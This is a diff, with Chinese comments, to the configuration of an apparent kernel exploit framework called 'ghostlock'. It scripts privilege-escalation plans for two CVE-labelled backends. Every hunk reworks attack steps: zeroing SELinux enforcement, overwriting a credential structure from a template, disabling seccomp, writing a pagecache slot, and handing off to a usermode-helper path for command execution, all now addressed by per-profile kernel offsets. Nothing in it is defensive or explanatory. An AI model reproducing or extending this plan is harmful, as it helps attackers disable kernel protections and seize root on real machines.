@@ -20,10 +20,11 @@ ghostlock {
         -- (1) 这一段在 root 之前跑一次（stage）：只声明，不执行
         local b = backend("cve_2026_43499")          -- 句柄（窗口外取得）
 
-        b:writeop{ target = "selinux_enforcing", value = 0, width = 4 }   -- W1（参数集已考古定稿）
-        -- 结构复制（考古新增的第二形态）：宽度 = profile 声明的结构尺寸
-        b:copyop{  src = "cred_template",      dst = "cred_target", width = cfg.sizes.cred }  -- W2
-        b:writeop{ target = "seccomp_mode",     value = 0, width = 8 }   -- W3
+        -- target = {kind, value}：kind 是机制枚举，value 来自数据面（运行期只加基址）
+        b:writeop{ target = { kind = "kernel_offset", value = cfg.offsets.selinux_enforcing }, value = 0, width = 4 }  -- W1
+        -- 结构复制：宽度 = profile 声明的结构尺寸；src/dst 同为目标形态
+        b:copyop{  src = { kind = "kernel_offset", value = cfg.offsets.cred_template }, dst = { kind = "kernel_offset", value = cfg.offsets.cred_target }, width = cfg.sizes.cred }  -- W2
+        b:writeop{ target = { kind = "kernel_offset", value = cfg.offsets.seccomp_mode }, value = 0, width = 8 }  -- W3
 
         -- 自由循环/条件（值来自数据面，不写死）
         local r = cfg.backend.cve_2026_43499.execution.race
@@ -43,13 +44,13 @@ ghostlock {
       description = "43284 pagecache + UMH：模块加载 -> 命令下发"
       plan = [==[
         local p = backend("cve_2026_43284")
-        p:writeop{ target = "pagecache_slot", value = 1, width = 8 }
+        p:writeop{ target = { kind = "kernel_offset", value = cfg.offsets.pagecache_slot }, value = 1, width = 8 }
         p:handoff{ terminal = "umh_forward" }
 
         -- 中途换路（方案 2：clean 句柄 + 重新 acquire）——route 只在 acquire 给，无「切换」动词
         close(p)                                        -- 释放旧句柄（generation 递增，旧句柄失效）
         local p2 = backend("cve_2026_43284", { route = "select_stack" })
-        p2:writeop{ target = "pagecache_slot", value = 1, width = 8 }
+        p2:writeop{ target = { kind = "kernel_offset", value = cfg.offsets.pagecache_slot }, value = 1, width = 8 }
         -- 收尾同上：由 Kotlin 在 resolve 后作为输入传入；本档不定义命令内容
       ]==]
     },
@@ -94,7 +95,7 @@ ghostlock {
 | 用到的条目 | 出现处 | 相位 |
 |---|---|---|
 | backend("cve_2026_43499") | 脚本首行 | 窗口外（取句柄） |
-| b:writeop{ target, value, width } | W1/W2/W3 与 43284 的写入 | **窗口相位** |
+| b:writeop{ target = {kind,value}, value, width } | W1/W2/W3 与 43284 的写入 | **窗口相位** |
 | b:settle{ us } | W3 重试循环内 | **窗口相位** |
 | b:handoff{ terminal, payload_ref } | 交接（**引用语义**：只声明 terminal + payload 引用） | 窗口外 |
 | cfg.backend... / cfg.lkm.path | 各处取数 | stage 期只读快照 |
